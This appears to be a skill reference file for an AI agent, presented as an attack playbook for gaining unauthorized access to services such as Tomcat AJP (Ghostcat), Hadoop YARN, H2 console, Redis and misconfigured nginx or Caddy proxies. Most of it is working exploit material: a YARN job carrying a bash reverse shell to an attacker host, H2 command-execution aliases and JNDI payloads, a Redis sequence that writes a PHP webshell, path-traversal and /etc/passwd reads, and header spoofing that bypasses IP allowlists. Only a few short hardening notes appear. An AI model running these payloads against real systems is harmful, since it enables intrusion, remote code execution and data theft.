# SKILL: Unauthorized Access to Common Services — Expert Attack Playbook: detailed technique reference

<!-- zhiyugo:resource:start -->
> ZhiyuGo reference material only. Inspect it explicitly through catalog resource tooling when the main Skill names this file; examples do not grant tools, authorization, or evidence.
<!-- zhiyugo:resource:end -->

<!-- zhiyugo:toc:start -->
## Contents

- [5. GHOSTCAT — AJP (PORT 8009) — CVE-2020-1938](#5-ghostcat-ajp-port-8009-cve-2020-1938)
- [6. HADOOP YARN RESOURCEMANAGER (PORT 8088)](#6-hadoop-yarn-resourcemanager-port-8088)
- [7. H2 DATABASE CONSOLE](#7-h2-database-console)
- [8. QUICK REFERENCE](#8-quick-reference)
- [9. REVERSE PROXY MISCONFIGURATION](#9-reverse-proxy-misconfiguration)
<!-- zhiyugo:toc:end -->

## 5. GHOSTCAT — AJP (PORT 8009) — CVE-2020-1938

### Mechanism

Apache JServ Protocol (AJP) is used between reverse proxy and Tomcat. AJP trusts all incoming data — an attacker connecting directly can set `javax.servlet.include.request_uri` to read arbitrary files from the webapp directory.

### File Read

```bash
# Using ajpShooter or similar:
python3 ajpShooter.py TARGET 8009 /WEB-INF/web.xml read

# Reads any file within the webapp root:
# /WEB-INF/web.xml          — deployment descriptor
# /WEB-INF/classes/*.class  — compiled Java classes
# /WEB-INF/lib/*.jar        — library JARs
```

### File Include → RCE

If a file upload exists (e.g., uploaded JSP disguised as image), AJP can include it as JSP:

```bash
python3 ajpShooter.py TARGET 8009 /uploaded_avatar.txt eval
# If the file contains JSP code, it gets executed
```

### Hardening

```xml
<!-- server.xml — disable AJP or add secret: -->
<Connector port="8009" protocol="AJP/1.3" secretRequired="true" secret="STRONG_SECRET"/>
<!-- Or remove the AJP connector entirely -->
```

---

## 6. HADOOP YARN RESOURCEMANAGER (PORT 8088)

### Detection

```bash
curl http://TARGET:8088/cluster
# If accessible → unauthenticated YARN ResourceManager UI
```

### RCE via Application Submission

```bash
# Submit a MapReduce application that executes a command:
curl -s -X POST http://TARGET:8088/ws/v1/cluster/apps/new-application
# Returns: {"application-id":"application_xxx_0001"}

curl -s -X POST http://TARGET:8088/ws/v1/cluster/apps \
  -H "Content-Type: application/json" \
  -d '{
    "application-id": "application_xxx_0001",
    "application-name": "test",
    "am-container-spec": {
      "commands": {"command": "/bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1"}
    },
    "application-type": "YARN"
  }'
```

### Hardening

Enable Kerberos authentication; restrict network access to management ports.

---

## 7. H2 DATABASE CONSOLE

### Detection

H2 Console is often enabled in Spring Boot apps via:
```
spring.h2.console.enabled=true
spring.h2.console.settings.web-allow-others=true
```

Access: `http://TARGET:PORT/h2-console`

### JNDI Injection via Connection String

In the H2 Console login form, the JDBC URL field accepts JNDI.

**BeanFactory + EL bypass** (works on Java 8u252+):

```text
# JDBC URL in login form:
javax.naming.InitialContext

# LDAP response attributes:
javaClassName: javax.el.ELProcessor
javaFactory: org.apache.naming.factory.BeanFactory
forceString: x=eval
x: Runtime.getRuntime().exec("id")
```

Also see `jndi-injection` for the full JNDI/BeanFactory exploitation flow.

### RCE via RUNSCRIPT

```sql
CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(cmd); return "ok"; }';
CALL EXEC('id');
```

---

## 8. QUICK REFERENCE

```text
# Redis — check auth:
redis-cli -h TARGET ping

# Redis — write webshell:
SET x "<?php system($_GET['c']);?>"
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SAVE

# Rsync — list modules:
rsync TARGET::

# Ghostcat — read web.xml:
python3 ajpShooter.py TARGET 8009 /WEB-INF/web.xml read

# YARN — submit RCE job:
curl -X POST http://TARGET:8088/ws/v1/cluster/apps/new-application

# H2 — RCE via alias:
CREATE ALIAS EXEC AS '...Runtime.exec...'; CALL EXEC('id');
```

---

## 9. REVERSE PROXY MISCONFIGURATION

### Nginx Off-By-Slash Path Traversal

```nginx
# Vulnerable configuration:
location /static {
    alias /var/www/static/;
}
# Access: /static../etc/passwd → resolves to /var/www/etc/passwd
# The missing trailing slash on location causes path traversal

# Fix: location /static/ (with trailing slash matching alias)
```

### Nginx Missing Root Location

```nginx
# If no root location defined and alias is used:
# Attacker may access nginx.conf or other server files
GET /..%2f..%2fetc/nginx/nginx.conf HTTP/1.1
```

### X-Forwarded-For / X-Real-IP Trust

```
# If backend trusts these headers for IP-based auth:
GET /admin HTTP/1.1
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
True-Client-IP: 127.0.0.1

# May bypass IP whitelist for admin panels
```

### Caddy Template Injection

```
# Caddy with templates enabled:
# If user input reaches Caddy template rendering:
{{.Req.Host}}          → Information disclosure
{{readFile "/etc/passwd"}}  → Local file read via Go template
# This is essentially a Go template injection through proxy config
```

### Useful Tools

- `yandex/gixy` — Nginx configuration analyzer
- `Raelize/Kyubi` — Reverse proxy misconfiguration scanner
- `GerbenJavado/bypass-url-parser` — URL parser confusion tester
